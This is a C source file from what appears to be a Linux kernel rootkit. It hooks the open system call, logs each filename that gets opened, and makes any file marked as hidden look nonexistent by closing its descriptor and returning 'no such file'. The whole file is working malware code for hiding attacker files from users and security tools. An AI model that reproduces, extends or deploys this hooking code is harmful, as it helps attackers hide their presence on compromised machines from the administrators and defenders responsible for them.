#include "files.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include "utils.h"
#include <linux/err.h>
#include <linux/fdtable.h>
#include <linux/limits.h>
#include <linux/printk.h>
#include <linux/string.h>
#include <linux/types.h>

// sys_open syscall hook handler
SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                      umode_t, ui16_mode)
{
    long l_ret               = 0;    // Return value of the real syscall
    const char *s_filename_k = NULL; // Name of the file
    const file_t *p_file     = NULL; // File structure representing what was opened

    l_ret = orig_open(p_regs);

    s_filename_k = strndup_user(s_filename, PATH_MAX);

    IF_U (IS_ERR_OR_NULL(s_filename_k)) {
        pr_err("[ROOTKIT] * Could not copy filename from user\n");
        // strncpy(s_filename_k, "(unknown)", PATH_MAX);
        s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
    }

    pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho) = %ld\n", s_filename_k, i32_flags, ui16_mode, l_ret);

    kfree_const(s_filename_k);

    // Check if the opened file is supposed to be hidden
    p_file = fd_get_file(l_ret);

    IF_U (IS_ERR_OR_NULL(p_file)) {
        pr_err("[ROOTKIT] * Could not get file structure\n");
    }
    else {
        IF_U (is_file_hidden(p_file)) {
            pr_info("[ROOTKIT]   * Hiding file\n");

            // Close the file descriptor
            close_fd(l_ret);

            return -ENOENT; // No such file or directory
        }
    }

    return l_ret;
}
